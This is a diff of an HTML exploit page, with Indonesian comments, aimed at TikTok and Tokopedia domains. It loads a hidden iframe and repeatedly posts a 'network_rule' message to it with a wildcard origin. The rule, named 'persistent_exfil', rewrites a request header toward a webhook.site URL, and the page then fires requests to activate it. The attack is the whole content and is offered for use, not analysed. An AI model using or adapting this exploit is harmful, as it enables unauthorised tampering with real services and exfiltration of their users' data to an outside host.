@@ -1,38 +1,57 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Loading...</title></head>
+<head><title>System Updating...</title></head>
 <body>
-    <iframe id="target" src="https://api-verification.tiktokshop.com/robots.txt" style="display:none;"></iframe>
+    <h1>[ STATUS: INITIALIZING ]</h1>
+    <iframe id="pwn_gate" src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" style="display:none;"></iframe>
 
     <script>
-        const frame = document.getElementById('target');
+        const gate = document.getElementById('pwn_gate');
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "slardar_bypass",
+                ruleName: "persistent_exfil",
                 global: true,
                 conditions: [],
                 handlers: [{
                     handler: "replace",
                     type: "header",
                     field: "X-Pns-Referrer",
-                    value: "VULN_BYPASS_LOGGING"
+                    value: webhook
                 }]
             }]
         };
 
-        frame.onload = function() {
-            console.log("Infiltrating Service Worker context...");
-            // Kirim payload ke context domain tiktokshop
-            frame.contentWindow.postMessage(payload, "*");
+        gate.onload = function() {
+            console.log("Gate opened. Starting injection...");
             
-            // Trigger fetch untuk memastikan rule aktif
-            setTimeout(() => {
-                const img = new Image();
-                img.src = "https://api-verification.tiktokshop.com/favicon.ico?trigger=" + Date.now();
-            }, 3000);
+            // Mengirim payload berkali-kali untuk menjamin eksekusi di Service Worker
+            let count = 0;
+            const bomb = setInterval(() => {
+                gate.contentWindow.postMessage(payload, "*");
+                count++;
+                if (count > 20) {
+                    clearInterval(bomb);
+                    console.log("Injection sequence complete.");
+                    triggerFetch();
+                }
+            }, 300);
         };
+
+        function triggerFetch() {
+            console.log("Triggering network rule...");
+            // Memicu fetch ke domain yang sama agar SW mengirim header ke webhook
+            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { mode: 'no-cors' });
+            
+            // Tambahan: Trigger ke Tokopedia juga karena scope SW-nya luas
+            const img = new Image();
+            img.src = "https://shop-id.tokopedia.com/favicon.ico?nocache=" + Date.now();
+        }
     </script>
+</body>
+</html>
 </body>
 </html>
